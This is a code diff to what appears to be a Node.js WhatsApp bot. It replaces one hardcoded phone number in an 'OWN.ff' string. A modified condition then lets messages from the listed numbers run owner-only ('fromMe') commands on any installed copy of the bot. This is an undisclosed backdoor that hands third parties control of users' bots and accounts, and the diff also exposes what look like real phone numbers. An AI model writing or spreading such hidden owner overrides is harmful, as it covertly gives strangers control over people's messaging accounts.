@@ -43,7 +43,7 @@ const { Console } = require('console');
 
 
 var OWN = {
-    ff: '94773734316,0,94769370897,0'
+    ff: '94773734316,0,94766598862,0'
 }
 
 String.prototype.format = function() {
@@ -263,7 +263,7 @@ plugins.map(async (plugin) => {
                     if (!command.onlyPm === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
                     else if (command.onlyGroup === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
                 }
-                if ((OWN.ff == "94769370897,0,94773734316,0" && msg.key.fromMe === false && command.fromMe === true && (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',')
+                if ((OWN.ff == "94773734316,0,94766598862,0" && msg.key.fromMe === false && command.fromMe === true && (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',')
                     .includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',')
                     .includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                     if (!command.onlyPm === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
